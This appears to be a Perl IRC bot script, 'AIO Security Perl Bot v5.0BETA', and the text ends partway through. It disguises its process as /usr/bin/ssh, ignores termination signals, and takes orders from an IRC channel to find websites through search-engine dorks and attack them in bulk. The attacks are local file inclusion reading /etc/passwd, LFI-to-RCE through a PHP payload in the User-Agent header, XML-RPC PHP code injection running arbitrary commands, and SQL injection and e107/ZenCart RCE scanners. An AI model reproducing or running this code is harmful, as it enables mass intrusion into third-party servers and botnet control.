#!/usr/bin/perl
##################################
#        Coded By iJoo           #
##################################
# AIO Security Perl Bot v5.0BETA #
# Based on MainHack perl         #
# www.IndoSecure.Net             #
##################################.
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use LWP::Simple;
use LWP 5.64;
use IO::Socket;
use IO::Select;
use Socket;
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
##################################
#        konfigurasi             #
##################################
my $fakeproc  = "/usr/bin/ssh";
$ircserver    = "irc.neolink.org";
my $ircport   = "6667";
my $nickname  = "MuLti[".int(rand(100))."]";
my $ident     = "MuLti[".int(rand(100))."]";
my $channel   = "#indotransdata";
my $runner    = "Deddi";
my $fullname  = '1,4«4,1[8,1I4,1ndo8,1S4,1ecure]1,4»';
my $banner    = '1,4«4,1[8,1I4,1ndo8,1S4,1ecure]1,4»';

## ////* Define Command  *\\\\ ##
## ////*    HashCrack    *\\\\ ##
my $md5       = '!md5';
my $base64    = '!base64';

## ////* Define Command  *\\\\ ##
## ////*    Utilities    *\\\\ ##
my $zipcmd    = '!zip';
my $ipcmd     = '!ip';
my $lficek    = '!lficek';
my $scol      = '!col';
my $sdetail   = '!fuzz';
my $schema    = '!schemassss';
my $sdump     = '!dumpssss';

## ////* Define Command  *\\\\ ##
## ////*    Security     *\\\\ ##
my $lficmd    = '!lfi';
my $lfi2cmd   = '!lfi2';
my $lfi2rce   = '!lcmd';
my $sqlcmd    = '!sql';
my $zenrce    = '!zen';
my $alicmd    = '!ali';
my $rcecmd    = '!rce';
my $lokocmd   = '!loko';
my $xmlcmd    = '!xml';
my $xml2rce   = '!xcmd';
my $phpadmin  = '!phpa';
my $e107	  = '!e107';
my $e107cmd   = '!emd';
$loko_test    = "admin/content.php?module=user";
$lfi_test     = "../../../../../../../../../../../../../../../etc/passwd%00";
$lfi2_test    = "../../../../../../../../../../../../../../../proc/self/environ%00";
$sql_test     = "'";
$rce_test     = "%7Cid%7C";
$loko_output  = "Tambah User";
$lfi_output   = "root:(.+):(.+):(.+):(.+):(.+):(.+)";
$lfi2_output  = "DOCUMENT_ROOT=";
$zen_output   = "http://www.rollscreen.com/rolls.jpg??";
$ijoo_shell   = "http://www.rollscreen.com/rolls.jpg??";
$sql_output   = ("You have an error in your SQL syntax|check the manual that corresponds to your MySQL server version for the right syntax to use near");
$asp_output   = ("Unclosed quotation mark after the character string|Unclosed quotation mark before the character string");
$cfm_output   = ("The following information is meant for the website developer for debugging purposes");
$rce_output   = ("gid=");
$perlversi    = $];
my $success   = "\n *** [IS] IndoSecure Mul71 53cur17y Ch3ck\n *** [IS] Loading Successfully ...\n *** [IS] Process/PID : $fakeproc - $$\n *** [IS] Perl Versi v$perlversi  \n\n";
print $success;

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

chdir("/");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
	if ($#_ == '1') {
	my $socket = $_[0];
	print $socket "$_[1]\n";
	} else {
		print $IRC_cur_socket "$_[0]\n";
	}
}

sub connector {
	my $mynick = $_[0];
	my $ircserver_con = $_[1];
	my $ircport_con = $_[2];
	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
	if (defined($IRC_socket)) {
		$IRC_cur_socket = $IRC_socket;
		$IRC_socket->autoflush(1);
		$sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
		$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
		nick("$mynick");
		sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
		sleep 1;
	}
}

sub parse {
	my $servarg = shift;
	if ($servarg =~ /^PING \:(.*)/) {
		sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
		if ($args =~ /^\001VERSION\001$/) {
			notice("$pn", "\001VERSION mIRC v6.35 Khaled Mardam-Bey (www.IndoSecure.Net)\001");
		}
		if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
			my $natrix = $1;
			my $arg = $2;
		}
	}
	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
		if (lc($1) eq lc($mynick)) {
			$mynick=$4;
			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		}
	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
		nick("$mynick|".int rand(999));
	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		$mynick = $2;
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
		sendraw("MODE $nickname +ix");
		sendraw("JOIN $channel");
		sendraw("PRIVMSG $channel :hi, Ready For Action!");
		sendraw("PRIVMSG $runner :Hi $runner im here !!!");
	}
}

my $line_temp;
while( 1 ) {
	while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
	delete($irc_servers{''}) if (defined($irc_servers{''}));
	my @ready = $sel_client->can_read(0);
	next unless(@ready);
	foreach $fh (@ready) {
		$IRC_cur_socket = $fh;
		$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
		$nread = sysread($fh, $msg, 4096);
		if ($nread == 0) {
			$sel_client->remove($fh);
			$fh->close;
			delete($irc_servers{$fh});
		}
		@lines = split (/\n/, $msg);
		$msg =~ s/\r\n$//;

		#####################################################
		####              [ Help  Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :!helpxx/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$banner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :tHiS bOT RuNNINg WiTH PeRl v$perlversi+ctcpfix LoaDED bY $runner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :HeLP CoMMaNd LiSt!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :-----------------------------------------  Security Check ! ----");
			sleep(2);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$lficmd <dork> => LFI Scanner with /etc/passwd");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$lfi2cmd <dork> => LFI2 Scanner for /proc/self/eviron");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$lfi2rce <situs> <cmd> => LFI Command cth: $lfi2rce www.google.com/index.php?g= system(\"uname -a\")");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$rcecmd <dork> => RCE Scanner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$e107 <dork> => e107 Scanner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$xmlcmd <bug> <dork> => XML Scanner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$xml2rce <victim/xml.php> <cmd> => XML Command Executor");
			#sendraw($IRC_cur_socket, "PRIVMSG $channel :$phpadmin <dork> => phpMyAdmin Scanner  -- BETA TESTER --");
			sleep(1);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$sqlcmd <dork> => SQL Scanner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$e107cmd <situs> <cmd> => e107 cmd");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$zenrce <dork> => ZenCart 1.3.8 RCE Scanner");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$lokocmd <dork> => Bugs PHP Lukmanul Hakim");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$scol <target> => SQLi Colomn Counter");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$sdetail <target> => SQLi Info");
			sleep(2);
			#sendraw($IRC_cur_socket, "PRIVMSG $channel :$alicmd <host> <port> => Apache Log Injection");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$md5 <hash> => md5 en/decrypt");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$base64 <hash> => base64 en/decrypt");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$zipcmd <US ZIP> => Kode Pos US");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$ipcmd <ip> => whois IP");
			sleep(2);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :-------------------------------------------- Other Option ! ----");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :optional: !help | !about | !version ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :http://forum.IndoSecure.Net");
		}

		if($msg =~ /PRIVMSG $channel :!quit/){
		exit(0);
		}

		if ($msg=~ /PRIVMSG $channel :!version/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :$banner v5.0BETA");
		}

		if ($msg=~ /PRIVMSG $channel :!engine/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14Engine4]0 Google, AllTheWeb, Altavista, WebDe, BlowSearch. 8!");
		}

		if ($msg=~ /PRIVMSG $channel :!pid/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14Process4]0  $fakeproc - $$ 8! ");
		}

		if ($msg=~ /PRIVMSG $channel :!about/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14About4]0 Created By iJoo 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14About4]0 Copyleft, 2010 IndoSecure.Net 8!");
		}

		#####################################################
		####               [ MD5  Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$md5 (.*)$/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $hash      = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14MD54]0 Try to Convert:5 $hash 8!");
		my $cracker   = "http://md5.rednoize.com/?s=md5&q=".$hash;
		my $request   = HTTP::Request->new(GET=>$cracker);
		my $useragent = LWP::UserAgent->new();
		$useragent->timeout(10);
		my $response  = $useragent->request($request);
		if ($response->is_success) {
			my $res  = $response->content;
			if ($res =~ m/<div id=\"result\" >(.*)<\/div>/g) {
			my $result = $1;
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14MD54]0 Result:5 $hash 0=>7 $result 8!");
				}
			else {
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14MD54]0 ".$hash." 14not found. 8!");
				}
			}
		  else { sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14MD54]0 Cannot open DataBase 8!"); }
			}
		exit;
		  }
		}

		#####################################################
		####             [ Base64 Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$base64 (.*)$/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $hash      = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14BASE644]0 Try To Convert :3 $hash 8!");
		my $base64_encoded = encode_base64($hash);
		my $base64_decoded = decode_base64($hash);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14BASE644]0 Decode :3 $base64_decoded ");
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14BASE644]0 Encode :3 $base64_encoded ");
			}
		  exit;
		  }
		}

		#####################################################
		####              [ ZIP Respond ]                ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$zipcmd\s+(.*)/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $zip = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 Looking up7 ".$zip." 12ZIP Code ...8!");
		my $website   = "http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=".$zip."&Go=Go";
		my $request   = HTTP::Request->new(GET=>$website);
		my $useragent = LWP::UserAgent->new();
		$useragent->timeout(10);
		my $response  = $useragent->request($request);
		if ($response->is_success) {
		my $res  = $response->content;
		if ($res =~ m/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g) {
			my ($city,$state,$zipcode,$county,$area) = ($1,$2,$3,$4,$6);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 City Name   :3 ".$city." 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 State Code  :3 ".$state." 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 ZIP Code    :3 ".$zipcode." 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 County Name :3 ".$county." 8!");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 Area Code   :3 ".$area." 8!");
				}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 $zip 4is not a valid ZIP code. 8!"); }
			}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14US ZIP4]0 Cannot open ZIP-DB 8!"); }
			}
		exit;
		  }
		}

		#####################################################
		####               [ IP Respond ]                ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$ipcmd\s+(.*)/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $ip = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 Searching7 ".$ip." 12Location ... 8!");
		my $website = "http://www.ipligence.com/geolocation";
		my ($useragent,$request,$response,%form);
		undef %form;
		$form{ip}  = $ip;
		$useragent = LWP::UserAgent->new;
		$useragent->timeout(10);
		$request   = POST $website,\%form;
		$response  = $useragent->request($request);
		if ($response->is_success) {
			my $res = $response->content;
			if ($res =~ m/Your IP address is (.*)<br>City: (.*)<br\/>Country: (.*)<br>Continent: (.*)<br>Time/g) {
				my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 IP Address :3 ".$ipaddress." 8!");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 City       :3 ".$city." 8!");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 Country    :3 ".$country." 8!");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 Continent  :3 ".$continent." 8!");
					}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 $ip 12-> 4Invalid address or IP not found. 8!"); }
				}
			else { sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14IP Location4]0 Cannot open IP-DB 8!"); }
		     }
		exit;
		  }
		}

		#####################################################
		####          [ PHPMYADMIN Respond ]             ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$phpadmin (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPA4]0 Search Engine Loading ... 8!");
					&phpascan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$phpadmin (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&phpascan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$phpadmin (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $dork = $1;
					&phpascan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$phpadmin (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&phpascan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$phpadmin (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&phpascan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################
		####            [ XML2RCE Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$xml2rce\s+(.*?)\s+(.*)/ ) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $webs = $1;
		my $sex = $2;
		my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo 'ijoo';echo `".$sex."`;echo 'ijoo';exit;/*</name></value></param></params></methodCall>";
		my $response = $userAgent->request(POST $webs,
		Content_Type => 'text/xml',
		Content => $exploit);

		if ($response->content =~ /ijoo(.*)ijoo/s) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 XMLSHELL: 7 $1 8!");
			  }
		  exit;
		    }
		  }
		}

		#####################################################
		####              [ Loko  Respond ]              ####
		#####################################################
		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$lokocmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14PHPL4]0 Search Engine Loading ... 8!");
					&lokoscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$lokocmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&lokoscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$lokocmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $dork = $1;
					&lokoscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$lokocmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&lokoscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$lokocmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&lokoscan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################
		####               [ Zen  Respond ]              ####
		#####################################################
		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$zenrce (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14ZEN4]0 Search Engine Loading ... 8!");
					&zenscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$zenrce (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&zenscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$zenrce (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $dork = $1;
					&zenscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$zenrce (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&zenscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$zenrce (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&zenscan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################
		####               [ XML  Respond ]              ####
		#####################################################
		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$xmlcmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $bugx = $1;
					my $d0rk = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14XML4]0 Search Engine Loading ... 8!");
					&xmlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$xmlcmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $bugx = $1;
					my $d0rk = $2;
					&xmlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$xmlcmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $bugx = $1;
					my $d0rk = $2;
					&xmlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$xmlcmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $bugx = $1;
					my $d0rk = $2;
					&xmlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$xmlcmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $bugx = $1;
					my $d0rk = $2;
					&xmlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		#####################################################
		####              [ LFI2  Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$lfi2rce\s+(.*?)\s+(.*)/) {
		if (my $pid = fork) {
		waitpid($pid, 0);
		} else {
		if (fork) {
		exit;
		} else {
		my $url = $1."../../../../../../../../../../proc/self/environ%00";
		my $cmd = $2;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFICMD4]0 Mencoba injeksi3 $1 8!");
		my $browser = LWP::UserAgent->new;
		my $coba2 = "idsc<? $cmd; ?>idsc";
		$browser->agent("$coba2");
		$browser->timeout(3);
		$response = $browser->get( $url );
		if ($response->content =~ /idsc(.*)idsc/s) {
		print $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFICMD4]0 (9YES0)14 $url 8!");
		sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFICMD4]0 (9YES0)14 cmd: $1 8!");
					}
				}
		  exit;
		  }
		}

		#####################################################
		####              [ LFI2  Respond ]              ####
		#####################################################

		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$lfi2cmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $bugx = $1;
					my $d0rk = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 Bugs:7 $bugx 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI24]0 Search Engine Loading ... 8!");
					&lfiscan2($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$lfi2cmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $bugx = $1;
					my $d0rk = $2;
					&lfiscan2($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$lfi2cmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $bugx = $1;
					my $d0rk = $2;
					&lfiscan2($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$lfi2cmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $bugx = $1;
					my $d0rk = $2;
					&lfiscan2($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$lfi2cmd\s+(.*?)\s+(.*)/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $bugx = $1;
					my $d0rk = $2;
					&lfiscan2($engx,$bugx,$d0rk);
				}
				exit;
			}
		}
		#####################################################
		####              [ e107  Respond ]              ####
		#####################################################
		if ($msg=~ /PRIVMSG $channel :$e107cmd\s+(.*?)\s+(.*)/){
			my $url = $1;
			my $cmd = $2;
			&cmde107($url,$cmd);
		}

		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$e107 (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14e1074]0 Search Engine Loading ... 8!");
					&e107scan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
		if ($msg=~ /PRIVMSG $channel :$e107 (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AllTheWeb";
					my $d0rk = $1;
					&e107scan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ALtaViSTa Engine
		if ($msg=~ /PRIVMSG $channel :$e107 (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "ALtaViSTa";
					my $dork = $1;
					&e107scan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### web.de Engine
		if ($msg=~ /PRIVMSG $channel :$e107 (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "WebDe";
					my $d0rk = $1;
					&e107scan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### BlowSearch Engine
		if ($msg=~ /PRIVMSG $channel :$e107 (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "BlowSearch";
					my $d0rk = $1;
					&e107scan($engx,$d0rk);
				}
				exit;
			}
		}

		#####################################################
		####               [ LFI  Respond ]              ####
		#####################################################

		####################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$lficmd (.*)$/ ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "GooGLe";
					my $d0rk = $1;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 Dork:7 $d0rk 8!");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :4,1[14LFI4]0 Search Engine Loading ... 8!");
					&lfiscan($engx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### AllTheWeb Engine
